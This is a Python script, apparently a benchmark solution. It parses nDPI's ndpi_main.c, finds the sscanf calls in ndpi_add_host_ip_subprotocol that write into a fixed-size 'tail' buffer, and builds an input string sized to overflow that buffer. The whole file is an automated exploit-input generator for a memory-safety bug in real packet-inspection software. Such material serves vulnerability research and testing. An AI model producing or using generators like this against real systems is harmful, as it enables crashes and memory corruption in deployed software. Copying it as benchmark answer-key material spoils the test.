import os
import re
import tarfile
from typing import List, Optional, Tuple, Dict, Any


def _read_file_from_dir(root: str, target_basename: str) -> Optional[str]:
    best_path = None
    best_score = -1
    for dirpath, _, filenames in os.walk(root):
        if target_basename in filenames:
            p = os.path.join(dirpath, target_basename)
            score = 0
            norm = p.replace("\\", "/").lower()
            if "/src/lib/" in norm:
                score += 50
            if norm.endswith("/src/lib/" + target_basename.lower()):
                score += 50
            if "/lib/" in norm:
                score += 10
            score -= len(norm)
            if score > best_score:
                best_score = score
                best_path = p
    if not best_path:
        return None
    try:
        with open(best_path, "rb") as f:
            return f.read().decode("utf-8", errors="ignore")
    except Exception:
        return None


def _read_file_from_tar(tar_path: str, target_basename: str) -> Optional[str]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            best_member = None
            best_score = -1
            for m in tf.getmembers():
                name = m.name.replace("\\", "/")
                if not name.lower().endswith("/" + target_basename.lower()):
                    continue
                norm = name.lower()
                score = 0
                if "/src/lib/" in norm:
                    score += 50
                if norm.endswith("/src/lib/" + target_basename.lower()):
                    score += 50
                if "/lib/" in norm:
                    score += 10
                score -= len(norm)
                if score > best_score:
                    best_score = score
                    best_member = m
            if not best_member:
                return None
            f = tf.extractfile(best_member)
            if not f:
                return None
            data = f.read()
            return data.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _read_ndpi_main(src_path: str) -> Optional[str]:
    if os.path.isdir(src_path):
        return _read_file_from_dir(src_path, "ndpi_main.c")
    return _read_file_from_tar(src_path, "ndpi_main.c")


def _c_unescape(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c != "\\":
            out.append(c)
            i += 1
            continue
        i += 1
        if i >= n:
            out.append("\\")
            break
        esc = s[i]
        i += 1
        if esc == "n":
            out.append("\n")
        elif esc == "r":
            out.append("\r")
        elif esc == "t":
            out.append("\t")
        elif esc == "v":
            out.append("\v")
        elif esc == "b":
            out.append("\b")
        elif esc == "f":
            out.append("\f")
        elif esc == "a":
            out.append("\a")
        elif esc == "\\":
            out.append("\\")
        elif esc == '"':
            out.append('"')
        elif esc == "'":
            out.append("'")
        elif esc == "?":
            out.append("?")
        elif esc == "0" or ("0" <= esc <= "7"):
            oct_digits = [esc]
            for _ in range(2):
                if i < n and "0" <= s[i] <= "7":
                    oct_digits.append(s[i])
                    i += 1
                else:
                    break
            try:
                out.append(chr(int("".join(oct_digits), 8) & 0xFF))
            except Exception:
                out.append("".join(oct_digits))
        elif esc == "x":
            hex_digits = []
            while i < n and s[i] in "0123456789abcdefABCDEF":
                hex_digits.append(s[i])
                i += 1
            if hex_digits:
                try:
                    out.append(chr(int("".join(hex_digits), 16) & 0xFF))
                except Exception:
                    out.append("x" + "".join(hex_digits))
            else:
                out.append("x")
        else:
            out.append(esc)
    return "".join(out)


def _extract_c_string_literals(expr: str) -> str:
    res = []
    i = 0
    n = len(expr)
    in_line_comment = False
    in_block_comment = False
    in_char = False
    while i < n:
        c = expr[i]
        if in_line_comment:
            if c == "\n":
                in_line_comment = False
            i += 1
            continue
        if in_block_comment:
            if c == "*" and i + 1 < n and expr[i + 1] == "/":
                in_block_comment = False
                i += 2
            else:
                i += 1
            continue
        if in_char:
            if c == "\\":
                i += 2
            elif c == "'":
                in_char = False
                i += 1
            else:
                i += 1
            continue
        if c == "/" and i + 1 < n:
            n2 = expr[i + 1]
            if n2 == "/":
                in_line_comment = True
                i += 2
                continue
            if n2 == "*":
                in_block_comment = True
                i += 2
                continue
        if c == "'":
            in_char = True
            i += 1
            continue
        if c == '"':
            i += 1
            start = i
            buf = []
            while i < n:
                cc = expr[i]
                if cc == "\\":
                    if i + 1 < n:
                        buf.append(expr[i])
                        buf.append(expr[i + 1])
                        i += 2
                    else:
                        buf.append("\\")
                        i += 1
                elif cc == '"':
                    break
                else:
                    buf.append(cc)
                    i += 1
            res.append(_c_unescape("".join(buf)))
            if i < n and expr[i] == '"':
                i += 1
            continue
        if c == "L" and i + 1 < n and expr[i + 1] == '"':
            i += 1
            continue
        i += 1
    return "".join(res)


def _build_string_define_map(text: str) -> Dict[str, str]:
    defines: Dict[str, str] = {}
    lines = text.splitlines(True)
    i = 0
    n = len(lines)
    while i < n:
        line = lines[i]
        m = re.match(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$', line)
        if not m:
            i += 1
            continue
        name = m.group(1)
        rest = m.group(2).rstrip("\n")
        while rest.rstrip().endswith("\\") and i + 1 < n:
            rest = rest.rstrip()
            rest = rest[:-1] + lines[i + 1].rstrip("\n")
            i += 1
        s = _extract_c_string_literals(rest)
        if s:
            defines[name] = s
        i += 1
    return defines


def _extract_function(text: str, func_name: str) -> Optional[str]:
    idx = 0
    n = len(text)
    in_line_comment = False
    in_block_comment = False
    in_str = False
    in_char = False
    while idx < n:
        c = text[idx]
        if in_line_comment:
            if c == "\n":
                in_line_comment = False
            idx += 1
            continue
        if in_block_comment:
            if c == "*" and idx + 1 < n and text[idx + 1] == "/":
                in_block_comment = False
                idx += 2
            else:
                idx += 1
            continue
        if in_str:
            if c == "\\":
                idx += 2
            elif c == '"':
                in_str = False
                idx += 1
            else:
                idx += 1
            continue
        if in_char:
            if c == "\\":
                idx += 2
            elif c == "'":
                in_char = False
                idx += 1
            else:
                idx += 1
            continue
        if c == "/" and idx + 1 < n:
            if text[idx + 1] == "/":
                in_line_comment = True
                idx += 2
                continue
            if text[idx + 1] == "*":
                in_block_comment = True
                idx += 2
                continue
        if c == '"':
            in_str = True
            idx += 1
            continue
        if c == "'":
            in_char = True
            idx += 1
            continue

        if text.startswith(func_name, idx):
            pre = text[idx - 1] if idx > 0 else " "
            post = text[idx + len(func_name)] if idx + len(func_name) < n else " "
            if (pre.isalnum() or pre == "_") or (post.isalnum() or post == "_"):
                idx += len(func_name)
                continue
            j = idx + len(func_name)
            while j < n and text[j].isspace():
                j += 1
            if j >= n or text[j] != "(":
                idx += len(func_name)
                continue
            par = 0
            k = j
            in_s2 = False
            in_c2 = False
            in_lc2 = False
            in_bc2 = False
            while k < n:
                ch = text[k]
                if in_lc2:
                    if ch == "\n":
                        in_lc2 = False
                    k += 1
                    continue
                if in_bc2:
                    if ch == "*" and k + 1 < n and text[k + 1] == "/":
                        in_bc2 = False
                        k += 2
                    else:
                        k += 1
                    continue
                if in_s2:
                    if ch == "\\":
                        k += 2
                    elif ch == '"':
                        in_s2 = False
                        k += 1
                    else:
                        k += 1
                    continue
                if in_c2:
                    if ch == "\\":
                        k += 2
                    elif ch == "'":
                        in_c2 = False
                        k += 1
                    else:
                        k += 1
                    continue
                if ch == "/" and k + 1 < n:
                    if text[k + 1] == "/":
                        in_lc2 = True
                        k += 2
                        continue
                    if text[k + 1] == "*":
                        in_bc2 = True
                        k += 2
                        continue
                if ch == '"':
                    in_s2 = True
                    k += 1
                    continue
                if ch == "'":
                    in_c2 = True
                    k += 1
                    continue
                if ch == "(":
                    par += 1
                elif ch == ")":
                    par -= 1
                    if par == 0:
                        k += 1
                        break
                k += 1
            if par != 0:
                idx += len(func_name)
                continue
            while k < n and text[k].isspace():
                k += 1
            if k >= n or text[k] != "{":
                idx += len(func_name)
                continue
            brace = 0
            start = k
            t = k
            in_s3 = False
            in_c3 = False
            in_lc3 = False
            in_bc3 = False
            while t < n:
                ch = text[t]
                if in_lc3:
                    if ch == "\n":
                        in_lc3 = False
                    t += 1
                    continue
                if in_bc3:
                    if ch == "*" and t + 1 < n and text[t + 1] == "/":
                        in_bc3 = False
                        t += 2
                    else:
                        t += 1
                    continue
                if in_s3:
                    if ch == "\\":
                        t += 2
                    elif ch == '"':
                        in_s3 = False
                        t += 1
                    else:
                        t += 1
                    continue
                if in_c3:
                    if ch == "\\":
                        t += 2
                    elif ch == "'":
                        in_c3 = False
                        t += 1
                    else:
                        t += 1
                    continue
                if ch == "/" and t + 1 < n:
                    if text[t + 1] == "/":
                        in_lc3 = True
                        t += 2
                        continue
                    if text[t + 1] == "*":
                        in_bc3 = True
                        t += 2
                        continue
                if ch == '"':
                    in_s3 = True
                    t += 1
                    continue
                if ch == "'":
                    in_c3 = True
                    t += 1
                    continue
                if ch == "{":
                    brace += 1
                elif ch == "}":
                    brace -= 1
                    if brace == 0:
                        t += 1
                        return text[start:t]
                t += 1
            return text[start:]
        idx += 1
    return None


def _extract_calls(text: str, func: str) -> List[str]:
    calls: List[str] = []
    n = len(text)
    i = 0
    in_line_comment = False
    in_block_comment = False
    in_str = False
    in_char = False
    while i < n:
        c = text[i]
        if in_line_comment:
            if c == "\n":
                in_line_comment = False
            i += 1
            continue
        if in_block_comment:
            if c == "*" and i + 1 < n and text[i + 1] == "/":
                in_block_comment = False
                i += 2
            else:
                i += 1
            continue
        if in_str:
            if c == "\\":
                i += 2
            elif c == '"':
                in_str = False
                i += 1
            else:
                i += 1
            continue
        if in_char:
            if c == "\\":
                i += 2
            elif c == "'":
                in_char = False
                i += 1
            else:
                i += 1
            continue

        if c == "/" and i + 1 < n:
            if text[i + 1] == "/":
                in_line_comment = True
                i += 2
                continue
            if text[i + 1] == "*":
                in_block_comment = True
                i += 2
                continue
        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_char = True
            i += 1
            continue

        if text.startswith(func, i):
            pre = text[i - 1] if i > 0 else " "
            post = text[i + len(func)] if i + len(func) < n else " "
            if (pre.isalnum() or pre == "_") or (post.isalnum() or post == "_"):
                i += len(func)
                continue
            j = i + len(func)
            while j < n and text[j].isspace():
                j += 1
            if j >= n or text[j] != "(":
                i += len(func)
                continue
            open_pos = j
            par = 0
            k = open_pos
            in_s2 = False
            in_c2 = False
            in_lc2 = False
            in_bc2 = False
            while k < n:
                ch = text[k]
                if in_lc2:
                    if ch == "\n":
                        in_lc2 = False
                    k += 1
                    continue
                if in_bc2:
                    if ch == "*" and k + 1 < n and text[k + 1] == "/":
                        in_bc2 = False
                        k += 2
                    else:
                        k += 1
                    continue
                if in_s2:
                    if ch == "\\":
                        k += 2
                    elif ch == '"':
                        in_s2 = False
                        k += 1
                    else:
                        k += 1
                    continue
                if in_c2:
                    if ch == "\\":
                        k += 2
                    elif ch == "'":
                        in_c2 = False
                        k += 1
                    else:
                        k += 1
                    continue
                if ch == "/" and k + 1 < n:
                    if text[k + 1] == "/":
                        in_lc2 = True
                        k += 2
                        continue
                    if text[k + 1] == "*":
                        in_bc2 = True
                        k += 2
                        continue
                if ch == '"':
                    in_s2 = True
                    k += 1
                    continue
                if ch == "'":
                    in_c2 = True
                    k += 1
                    continue
                if ch == "(":
                    par += 1
                elif ch == ")":
                    par -= 1
                    if par == 0:
                        k += 1
                        break
                k += 1
            if par == 0:
                calls.append(text[i:k])
                i = k
                continue
        i += 1
    return calls


def _split_top_level_args(arglist: str) -> List[str]:
    args: List[str] = []
    n = len(arglist)
    i = 0
    start = 0
    depth_par = 0
    depth_br = 0
    depth_sq = 0
    in_str = False
    in_char = False
    in_line_comment = False
    in_block_comment = False

    def flush(end: int) -> None:
        s = arglist[start:end].strip()
        if s:
            args.append(s)

    while i < n:
        c = arglist[i]
        if in_line_comment:
            if c == "\n":
                in_line_comment = False
            i += 1
            continue
        if in_block_comment:
            if c == "*" and i + 1 < n and arglist[i + 1] == "/":
                in_block_comment = False
                i += 2
            else:
                i += 1
            continue
        if in_str:
            if c == "\\":
                i += 2
            elif c == '"':
                in_str = False
                i += 1
            else:
                i += 1
            continue
        if in_char:
            if c == "\\":
                i += 2
            elif c == "'":
                in_char = False
                i += 1
            else:
                i += 1
            continue

        if c == "/" and i + 1 < n:
            if arglist[i + 1] == "/":
                in_line_comment = True
                i += 2
                continue
            if arglist[i + 1] == "*":
                in_block_comment = True
                i += 2
                continue
        if c == '"':
            in_str = True
            i += 1
            continue
        if c == "'":
            in_char = True
            i += 1
            continue

        if c == "(":
            depth_par += 1
        elif c == ")":
            if depth_par > 0:
                depth_par -= 1
        elif c == "{":
            depth_br += 1
        elif c == "}":
            if depth_br > 0:
                depth_br -= 1
        elif c == "[":
            depth_sq += 1
        elif c == "]":
            if depth_sq > 0:
                depth_sq -= 1
        elif c == "," and depth_par == 0 and depth_br == 0 and depth_sq == 0:
            flush(i)
            i += 1
            start = i
            continue
        i += 1

    flush(n)
    return args


def _get_call_args(call_text: str) -> Optional[List[str]]:
    p = call_text.find("(")
    if p < 0:
        return None
    inner = call_text[p + 1:]
    if inner.endswith(")"):
        inner = inner[:-1]
    return _split_top_level_args(inner)


def _clean_c_expr(expr: str) -> str:
    s = expr.strip()
    prev = None
    while prev != s:
        prev = s
        s = s.strip()
        s = re.sub(r'^\(\s*[^()]*\)\s*', '', s)
        s = s.strip()
        if s.startswith("&"):
            s = s[1:].strip()
        if s.startswith("*"):
            s = s[1:].strip()
        if s.startswith("(") and s.endswith(")"):
            s2 = s[1:-1].strip()
            if s2:
                s = s2
    return s.strip()


def _find_tail_arg_index(args: List[str]) -> Optional[int]:
    for idx in range(2, len(args)):
        a = _clean_c_expr(args[idx])
        if re.fullmatch(r'tail(\s*\[[^\]]+\])?', a):
            return idx
        if re.search(r'\btail\b', a):
            if a == "tail" or a.endswith("tail") or a.startswith("tail"):
                return idx
    return None


def _parse_int_literal(s: str) -> Optional[int]:
    s = s.strip()
    m = re.fullmatch(r'(\d+)', s)
    if m:
        try:
            return int(m.group(1))
        except Exception:
            return None
    m = re.fullmatch(r'(0x[0-9a-fA-F]+)', s)
    if m:
        try:
            return int(m.group(1), 16)
        except Exception:
            return None
    return None


def _find_tail_buffer_size(func_text: str, full_text: str, defines: Dict[str, str]) -> int:
    m = re.search(r'\btail\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]', func_text)
    if not m:
        m = re.search(r'\bchar\s+tail\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]', full_text)
    if not m:
        return 32
    tok = m.group(1)
    v = _parse_int_literal(tok)
    if v is not None and v > 0:
        return v
    m2 = re.search(r'^\s*#\s*define\s+' + re.escape(tok) + r'\s+(\d+)\b', full_text, flags=re.M)
    if m2:
        try:
            v2 = int(m2.group(1))
            if v2 > 0:
                return v2
        except Exception:
            pass
    return 32


def _parse_scanset(raw: str) -> Tuple[bool, str]:
    if raw.startswith("^"):
        return True, raw[1:]
    return False, raw


def _is_char_in_scanset(ch: str, charset: str) -> bool:
    i = 0
    n = len(charset)
    last = None
    while i < n:
        c = charset[i]
        if c == "-" and last is not None and i + 1 < n:
            nxt = charset[i + 1]
            lo = ord(last)
            hi = ord(nxt)
            o = ord(ch)
            if lo <= hi:
                if lo <= o <= hi:
                    return True
            else:
                if hi <= o <= lo:
                    return True
            last = None
            i += 2
            continue
        if ch == c:
            return True
        last = c
        i += 1
    return False


def _choose_char_for_scanset(raw: str, is_tail: bool = False) -> str:
    negate, setpart = _parse_scanset(raw)
    preferred = ["A", "a", "1", "0", ".", "_", "-", "Z", "b", "9"]
    if is_tail:
        preferred = ["A", "Z", "a", "1", "0", ".", "_", "-"]
    for ch in preferred:
        in_set = _is_char_in_scanset(ch, setpart)
        ok = (not in_set) if negate else in_set
        if ok:
            return ch
    for o in range(33, 127):
        ch = chr(o)
        in_set = _is_char_in_scanset(ch, setpart)
        ok = (not in_set) if negate else in_set
        if ok:
            return ch
    return "A"


def _parse_scanf_conversions(fmt: str) -> List[Dict[str, Any]]:
    convs: List[Dict[str, Any]] = []
    i = 0
    n = len(fmt)
    while i < n:
        if fmt[i] != "%":
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            i += 2
            continue
        i += 1
        suppressed = False
        if i < n and fmt[i] == "*":
            suppressed = True
            i += 1
        width_digits = []
        while i < n and fmt[i].isdigit():
            width_digits.append(fmt[i])
            i += 1
        width = int("".join(width_digits)) if width_digits else None

        if i < n and fmt[i] == "$" and width_digits:
            while i < n and fmt[i] == "$":
                i += 1
            width = None

        if i < n and fmt[i] in "hljztL":
            if fmt[i] in "hl" and i + 1 < n and fmt[i + 1] == fmt[i]:
                i += 2
            else:
                i += 1
            if i < n and fmt[i] in "hljztL":
                i += 1

        if i >= n:
            break
        spec = fmt[i]
        i += 1
        scanset_raw = None
        if spec == "[":
            j = i
            if j < n and fmt[j] == "]":
                j += 1
            while j < n:
                if fmt[j] == "]":
                    break
                j += 1
            scanset_raw = fmt[i:j] if j <= n else fmt[i:]
            i = j + 1 if j < n else n
        convs.append({"spec": spec, "suppressed": suppressed, "width": width, "scanset": scanset_raw})
    return convs


def _generate_input_from_format(fmt: str, tail_assign_index: int, tail_buf_size: int) -> str:
    i = 0
    n = len(fmt)
    assign_idx = 0
    out = []
    last_was_space = False

    def add_space():
        nonlocal last_was_space
        if out and not last_was_space:
            out.append(" ")
            last_was_space = True

    def add_lit(ch: str):
        nonlocal last_was_space
        out.append(ch)
        last_was_space = ch.isspace()

    while i < n:
        c = fmt[i]
        if c == "%":
            if i + 1 < n and fmt[i + 1] == "%":
                add_lit("%")
                i += 2
                continue
            i += 1
            suppressed = False
            if i < n and fmt[i] == "*":
                suppressed = True
                i += 1
            while i < n and fmt[i].isdigit():
                i += 1
            if i < n and fmt[i] == "$":
                while i < n and fmt[i] == "$":
                    i += 1
            if i < n and fmt[i] in "hljztL":
                if fmt[i] in "hl" and i + 1 < n and fmt[i + 1] == fmt[i]:
                    i += 2
                else:
                    i += 1
                if i < n and fmt[i] in "hljztL":
                    i += 1
            if i >= n:
                break
            spec = fmt[i]
            i += 1
            scanset_raw = None
            if spec == "[":
                j = i
                if j < n and fmt[j] == "]":
                    j += 1
                while j < n and fmt[j] != "]":
                    j += 1
                scanset_raw = fmt[i:j] if j <= n else fmt[i:]
                i = j + 1 if j < n else n

            is_tail = (not suppressed) and (assign_idx == tail_assign_index)
            if spec in "diuoxX":
                tok = "1"
            elif spec in "aAeEfFgG":
                tok = "1"
            elif spec == "p":
                tok = "1"
            elif spec == "c":
                tok = "A" if is_tail else "a"
            elif spec == "s":
                tok = ("A" * max(1, tail_buf_size)) if is_tail else "a"
            elif spec == "n":
                tok = ""
            elif spec == "[":
                ch = _choose_char_for_scanset(scanset_raw or "", is_tail=is_tail)
                tok = (ch * max(1, tail_buf_size)) if is_tail else ch
            else:
                tok = ("A" * max(1, tail_buf_size)) if is_tail else "a"

            if tok:
                out.append(tok)
                last_was_space = tok[-1].isspace()

            if not suppressed:
                assign_idx += 1
            continue
        if c.isspace():
            add_space()
            i += 1
            continue
        add_lit(c)
        i += 1

    return "".join(out)


def _get_format_string(arg: str, defines: Dict[str, str]) -> Optional[str]:
    s = _extract_c_string_literals(arg)
    if s:
        return s
    name = _clean_c_expr(arg)
    if re.fullmatch(r'[A-Za-z_]\w*', name) and name in defines:
        return defines[name]
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        text = _read_ndpi_main(src_path)
        if not text:
            return b"A" * 56

        defines = _build_string_define_map(text)
        func_text = _extract_function(text, "ndpi_add_host_ip_subprotocol")
        if not func_text:
            func_text = text

        tail_size = _find_tail_buffer_size(func_text, text, defines)
        calls = _extract_calls(func_text, "sscanf")

        best: Optional[str] = None
        best_len = 10**18

        for call in calls:
            if "tail" not in call:
                continue
            args = _get_call_args(call)
            if not args or len(args) < 3:
                continue
            tail_arg_idx = _find_tail_arg_index(args)
            if tail_arg_idx is None:
                continue

            fmt = _get_format_string(args[1], defines)
            if not fmt:
                continue

            convs = _parse_scanf_conversions(fmt)
            non_suppressed = [c for c in convs if not c.get("suppressed")]
            tail_assign_idx = tail_arg_idx - 2
            if tail_assign_idx < 0 or tail_assign_idx >= len(non_suppressed):
                continue
            tail_conv = non_suppressed[tail_assign_idx]
            spec = tail_conv.get("spec")
            width = tail_conv.get("width")
            if spec not in ("s", "["):
                continue
            if width is not None and width <= (tail_size - 1):
                continue

            inp = _generate_input_from_format(fmt, tail_assign_idx, tail_size)
            if not inp:
                continue

            inp = inp.rstrip("\n")
            if len(inp) < best_len:
                best = inp
                best_len = len(inp)

        if best is None:
            return b"A" * 56
        return best.encode("latin-1", errors="ignore")